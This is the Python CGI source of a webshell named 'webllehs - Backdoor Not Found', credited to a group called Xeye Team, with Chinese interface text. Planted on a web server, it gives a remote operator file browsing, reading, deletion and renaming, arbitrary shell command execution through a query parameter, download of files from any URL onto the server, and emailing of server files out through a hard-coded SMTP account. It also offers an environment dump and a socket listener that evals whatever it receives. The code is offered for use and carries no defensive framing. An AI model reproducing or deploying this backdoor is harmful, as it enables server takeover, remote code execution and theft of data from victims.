#encoding=utf8
#
#Version: 1.5
#Author: cosine
#Date: 2010/07
#Desc:
#webllehs - Backdoor Not Found
#from http://xeyeteam.appspot.com/
import sys, os
import re
import cgi
import time
import socket
import shutil
import urllib
import urllib2
import smtplib
from email.Header import Header
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart

#sys.stderr = sys.stdout

#初始化变量++++++++++++++++++++++++++++++++++++++++++++++++++++

#该程序依据path参数标志出当前所在目录，此变量不需修改
#例如: http://www.test.com/webllehs.py?path=.
path = '.'

#SELF_NAME的指必须与该程序的文件名相同
SELF_NAME = 'webllehs.py'

#初始化变量++++++++++++++++++++++++++++++++++++++++++++++++++++

class XeyeHandle:
    def __init__(self):
        pass
    def isExists(self, resource):
        try:
            if os.path.exists(resource):
                return True
            else:
                return False
        except:
            return False
    def listDir(self, path):
        try:
            return os.listdir(path)
        except:
            print '路径错误。'
            return []
    def listFormatedDir(self, path):
        allDir = self.listDir(path)
        os.chdir(path)
        print '<table width="970" border="0" cellspacing="0" cellpadding="0">'
        print '<tr align="Left"><th>资源</th><th>最后修改时间</th><th>大小</th><th>模式</th><th>操作</th></tr>'
        for i in allDir:
            if os.path.isdir(i):
                print '<tr onmouseover="cColor(this)" onmouseout="rColor(this)"><td class="blue">%s</td><td>%s</td><td>-</td><td>%s</td><td>%s</td></tr>'\
                      %('<a href="?path='+path+'/'+i+'" title="进入该目录">' + i + '</a>', self.lastModified(i), self.resourceMode(i), \
                        '<a href="?path='+path+'&delfold='+path+'/'+i+'" title="删除该目录">Del</a>/<a href="javascript:rename(\'' + path + '/' + i + '\',\''+path+'\');" title="重命名该目录">Rename</a>')
        for i in allDir:
            if not os.path.isdir(i):
                print '<tr onmouseover="cColor(this)" onmouseout="rColor(this)"><td class="green">%s</td><td>%s</td><td>%sKB</td><td>%s</td><td>%s</td></tr>'\
                      %(i, self.lastModified(i), self.fileSize(i), self.resourceMode(i), \
                        '<a href="?path='+path+'&readfile='+path+'/'+i+'" title="读取该文件内容">R</a>/<a href="javascript:copyFile(\'' + i + '\',\''+path+'\');" title="复制该文件">C</a>/<a href="" title="下载该文件">D</a>/\
                        <a href="?path='+path+'&delfile='+path+'/'+i+'" title="删除该文件">Del</a>/<a href="javascript:rename(\'' + path + '/' + i + '\',\''+path+'\');" title="重命名该文件">Rename</a>')

        print '</table>'

    def currentPath(self):
        return os.getcwd()
    def url(self):
        return 'http://' + os.environ['SERVER_NAME'] + os.environ['SCRIPT_NAME']

    def lastModified(self, resource):
        m = os.path.getmtime(resource)
        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(m))
    def fileSize(self, _file):
        s = str(os.path.getsize(_file)/1024.0)
        site = s.split('.')[0] + '.' + s.split('.')[1][:2]
        return site
    def resourceMode(self, resource):
        xrw = ''
        if os.access(resource, os.R_OK):
            xrw += 'R/'
        else:
            xrw += '-/'
        if os.access(resource, os.W_OK):
            xrw += 'W/'
        else:
            xrw += '-/'
        if os.access(resource, os.X_OK):
            xrw += 'X'
        else:
            xrw += '-'
        return xrw
    def delFold(self, fold):
        try:
            __str = str(fold).split('/')
            __fold = __str[len(__str)-1:len(__str)][0]
        except:
            __fold = fold
        try:
            os.rmdir(fold)
            return '目录（' + __fold + '）删除成功。'
        except:
            return '目录（' + __fold + '）删除失败。'
    def delFile(self, _file):
        try:
            __str = str(_file).split('/')
            __file = __str[len(__str)-1:len(__str)][0]
        except:
            __file = _file
        try:
            os.unlink(_file)
            return '文件（' + __file + '）删除成功。'
        except:
            return '文件（' + __file + '）删除失败。'
    def rename(self, resource1, resource2):
        try:
            __str = str(resource1).split('/')
            __resource1 = __str[len(__str)-1:len(__str)][0]
            __str = str(resource2).split('/')
            __resource2 = __str[len(__str)-1:len(__str)][0]
        except:
            __resource1 = resource1
            __resource2 = resource2
        try:
            os.rename(resource1, resource2)
            return __resource1 + '重命名为' + __resource2 + '成功。'
        except:
            return __resource1 + '重命名为' + __resource2 + '失败。'
    def copyFile(self, resource1, resource2):
        try:
            __str = str(resource1).split('/')
            __resource1 = __str[len(__str)-1:len(__str)][0]
        except:
            __resource1 = resource1
        __resource2 = resource2
        try:
            shutil.copyfile(resource1, resource2)
            return __resource1 + '复制到' + __resource2 + '成功。'
        except:
            return __resource1 + '复制到' + __resource2 + '失败。'
    def createFold(self, fold):
        try:
            os.mkdir(fold)
            return '文件夹' + str(fold) + '创建成功。'
        except:
            return '文件夹' + str(fold) + '创建失败。'
    def getFileContent(self, _file):
        f = open(_file, 'r')
        flist = f.readlines()
        f.close()
        content = ''.join(flist)
        #try:
            #content = content.decode('utf-8').encode('gb2312')
        #except:
            #pass
        return self.escape(content).replace('\n','<br />')
    def serverInfo(self, environ=os.environ):
        keys = environ.keys()
        keys.sort()
        i = 0
        info = '<table width="970" border="0" cellspacing="0" cellpadding="0">'
        info += '<tr align="Left"><th>名称</th><th>值</th></tr>'
        for key in keys:
            info += '<tr class="normal"><td>'+self.escape(key)+'</td><td>'+self.escape(environ[key])+'</td></tr>'
        info += '</table>'
        return info

    def get(self, name):
        q_str = os.environ['QUERY_STRING']
        q_list = q_str.split('&')
        for q in q_list:
            if q.split('=')[0].lower() == name:
                return urllib.unquote(q.split('=')[1].replace('+',' '))
    def escape(self, content):
        content = content.replace("&", "&amp;")
        content = content.replace("<", "&lt;")
        content = content.replace(">", "&gt;")
        if 0:
            content = content.replace('"', "&quot;")
        return content
    def startSocket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('60.32.52.10', 8077))
        sock.listen(3)
        while True:
            connection,address = sock.accept()
            #connection.settimeout(5)
            bufcmd = connection.recv(1024)
            print '<font color="#FF0000">your command is:</font><br />'
            print bufcmd
            print '<br />--------------------------------------<br /><br />'
            if bufcmd == 'exit':
                print 'socket exit......<br />'
                connection.send('bye!')
                break
            else:
                try:
                    print bufcmd + '>> eval result:<br />'
                    print eval(bufcmd) + '<br />'
                    connection.send('success!')
                except:
                    print '指令执行失败......<br />'
                    connection.send('fail!')
    #def evalCmd(self, cmd):
    #    yourcmd = urllib.unquote(cmd)
    #    try:
    #        print yourcmd + '>> eval result:<br />'
    #        print eval(yourcmd) + '<br />'
    #    except:
    #        print '指令执行失败......<br />'
    def evalCmd(self, cmd):
        cmd_result = os.popen(cmd).read()
        cmd_result = self.escape(cmd_result).strip().replace(os.linesep,'<br />')
        print cmd + '>> eval result:<br />'
        print cmd_result + '<br />'
    def uploadFile(self, url, localpath):
        try:
            urllib.urlretrieve(url,localpath)
            return '文件' + url + '上传成功。'
        except:
            return '文件' + url + '上传失败。'
    def email(self, _to, _file):
        try:
            __str = str(_file).split('/')
            __file = __str[len(__str)-1:len(__str)][0]
        except:
            __file = _file
        try:
            msg = MIMEMultipart()
            att = MIMEText(open(_file, 'rb').read(), 'base64', 'gb2312')
            att["Content-Type"] = 'application/octet-stream'		
            att["Content-Disposition"] = 'attachment; filename=' + __file
            msg.attach(att)

            msg['to'] = _to
            msg['from'] = 'supern0va@126.com'
            msg['subject'] = Header('from py_webshell: ' + __file, 'utf-8')
            server = smtplib.SMTP('smtp.126.com')
            server.login('supern0va@126.com', 'supernova *')
            server.sendmail(msg['from'], msg['to'], msg.as_string())
            server.close
            return '文件' + __file + '发送到' + _to + '成功。'
        except:
            return '文件' + __file + '发送到' + _to + '失败。'


__x = XeyeHandle()

print """Content-type: text/html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Backdoor Not Found</title>
<style>
body{font-family:Courier New;font-size:13px;background:#222;color:#32CD32;}
a,a:visited{color:#eee;text-decoration:none;}
a:hover{text-decoration:underline;}
.blue{color:#1735DF;}
.blue a,.blue a:hover,.blue a:visited{color:#1735DF;text-decoration: none;}
.green{color:#32CD32;}
</style>
<script>
function cColor(o){
      o.style.background = "#555";
}
function rColor(o){
      o.style.background = "#222";
}
function new_form(method){
      var f = document.createElement("form");
      document.body.appendChild(f);
      f.method = method;
      return f;
}
function create_elements(eForm, eName, eValue){
      var e = document.createElement("input");
      eForm.appendChild(e);
      e.type = 'text';
      e.name = eName;
      if(!document.all){e.style.display = 'none';}else{
      e.style.display = 'block';
      e.style.width = '0px';
      e.style.height = '0px';
      }
      e.value = eValue;
      return e;
}
function rename(oldname, path){
      var newname;
      newname = prompt('将文件（'+oldname+'）命名为：', '');
      if (!newname) return;
      newname = path + '/' + newname
      var formObj = new_form("get");
      create_elements(formObj, "oldname", oldname);
      create_elements(formObj, "newname", newname);
      create_elements(formObj, "path", path);"""
print '      formObj.action= "'+ SELF_NAME + '";'
print """      formObj.submit();
}
function copyFile(copyname, path){
      var newname;
      newname = prompt('将文件（'+copyname+'）复制到：', '');
      if (!newname) return;
      var formObj = new_form("get");
      create_elements(formObj, "copyname", copyname);
      create_elements(formObj, "newname", newname);
      create_elements(formObj, "path", path);"""
print '      formObj.action= "'+ SELF_NAME + '";'
print """      formObj.submit();
}
function createFold(path){
      fold = prompt('在当前路径下创建一个新目录：', '');
      if (!fold) return;
      fold = path + '/' + fold
      var formObj = new_form("post");
      create_elements(formObj, "createfold", fold);
      create_elements(formObj, "path", path);"""
print '      formObj.action= "'+ SELF_NAME + '";'
print """      formObj.submit();
}
function evalCmd(path){
      cmd = prompt('输入你要执行的system命令', 'echo hi');
      if (!cmd) return;
      var formObj = new_form("get");
      create_elements(formObj, "cmd", cmd);
      create_elements(formObj, "path", path);"""
print '      formObj.action= "'+ SELF_NAME + '";'
print """      formObj.submit();
}
function uploadFile(path){
      url = prompt('输入目标文件的url地址：', '');
      localPath = prompt('输入本地路径：', '');
      if (!url || !localPath) return;
      var formObj = new_form("get");
      create_elements(formObj, "targeturl", url);
      create_elements(formObj, "localpath", localPath);
      create_elements(formObj, "path", path);"""
print '      formObj.action= "'+ SELF_NAME + '";'
print """      formObj.submit();
}
function email(path){
      emailTo = prompt('输入要email对象：', '');
      emailFile = prompt('输入要email的目标文件的本地绝对路径：', '');
      if (!emailTo || !emailFile) return;
      var formObj = new_form("get");
      create_elements(formObj, "emailto", emailTo);
      create_elements(formObj, "emailfile", emailFile);
      create_elements(formObj, "path", path);"""
print '      formObj.action= "'+ SELF_NAME + '";'
print """      formObj.submit();
}
</script>
</head>
<body>"""

#form = cgi.FieldStorage()
#print 'cgi form', form.keys()

#delete file
try:
    del_file = __x.get('delfile')
    if del_file:
        try:
            path = __x.get('path')
        except:
            path = ''
        print __x.delFile(del_file), '| <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />'
except:
    pass
#delete fold
try:
    del_fold = __x.get('delfold')
    if del_fold:
        try:
            path = __x.get('path')
        except:
            path = ''
        print __x.delFold(del_fold), '| <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />'
except:
    pass
#rename file or fold
try:
    oldname = __x.get('oldname')
    newname = __x.get('newname')
    if oldname and newname:
        try:
            path = __x.get('path')
        except:
            path = ''
        print __x.rename(oldname, newname), '| <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />'
except:
    pass
#copy file
try:
    copyname = __x.get('copyname')
    newname = __x.get('newname')
    if copyname and newname:
        try:
            path = __x.get('path')
        except:
            path = ''
        print __x.copyFile(copyname, newname), '| <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />'
except:
    pass
#create fold
try:
    createfold = __x.get('createfold')
    if createfold:
        try:
            path = __x.get('path')
        except:
            path = ''
        print __x.createFold(createfold), '| <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />'
except:
    pass
#upload file from internet
try:
    targeturl = __x.get('targeturl')
    localpath = __x.get('localpath')
    if targeturl and localpath:
        try:
            path = __x.get('path')
        except:
            path = ''
        print __x.uploadFile(targeturl, localpath), '| <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />'
except:
    pass
#mail file to target-email
try:
    mailto = __x.get('emailto')
    mailfile = __x.get('emailfile')
    if mailto and mailfile:
        try:
            path = __x.get('path')
        except:
            path = ''
        print __x.email(mailto, mailfile), '| <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />'
except:
    pass
#read content of file
try:
    readfile = __x.get('readfile')
    if readfile:
        try:
            path = __x.get('path')
        except:
            path = ''
        print '文件内容如下： | <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />------------------------------------------------------------- <br />'
        print __x.getFileContent(readfile)
        print '<br />------------------------------------------------------------- <br /><br />'
except:
    pass
#server info
try:
    serverinfo = __x.get('serverinfo')
    if serverinfo == "true":
        try:
            path = __x.get('path')
        except:
            path = ''
        print '服务器信息如下： | <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />------------------------------------------------------------- <br />'
        print __x.serverInfo()
        print '<br />------------------------------------------------------------- <br /><br />'
except:
    pass
#socket connection
try:
    socketinfo = __x.get('socket')
    if socketinfo == "true":
        try:
            path = __x.get('path')
        except:
            path = ''
        print 'Socket通信执行如下： | <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />------------------------------------------------------------- <br />'
        __x.startSocket()
        print '<br />------------------------------------------------------------- <br /><br />'
except:
    pass
#eval cmd
try:
    cmd = __x.get('cmd')
    if cmd:
        try:
            path = __x.get('path')
        except:
            path = ''
        print '命令执行结果如下： | <a href="', __x.url()+'?path='+path+'">返回</a>'
        print '<br />------------------------------------------------------------- <br />'
        __x.evalCmd(cmd)
        print '<br />------------------------------------------------------------- <br /><br />'
except:
    pass

#absolute path
try:
    path = __x.get('path')
    if path == '' or path == '.':
        path = __x.currentPath()
except Exception,e:
    path = __x.currentPath()
        
print "<form action=\""+SELF_NAME+"\" method=\"get\">"
print "<input type=\"text\" name=\"path\" style=\"width:600px\" value=\""+path+"\" />"
print """
<input type="submit" value="跳转目录" />
</form><br />
"""
print '<a href="?path=">Webshell目录</a> | <a href="javascript:createFold(\''+path+'\');">创建目录</a> \
| <a href="javascript:uploadFile(\''+path+'\');">上传文件</a> | <a href="javascript:email(\''+path+'\');">Email发送文件</a> \
| <a href="javascript:evalCmd(\''+path+'\');">执行命令</a> | <a href="?socket=true&path='+path+'">Socket反弹</a> \
| <a href="?serverinfo=true&path='+path+'">服务器信息</a> |<br /><br />'

print "<a href='?path="+os.sep.join(path.split(os.sep)[:-1])+"'>上级目录</a> | 当前路径（<b>" + path + "</b>）下的资源：<br />"
__x.listFormatedDir(path)

print """<br />(C)<a href="http://xeyeteam.appspot.com/" target="_blank">Xeye Team</a> - Hacking No Area 2010</body>
</html>"""
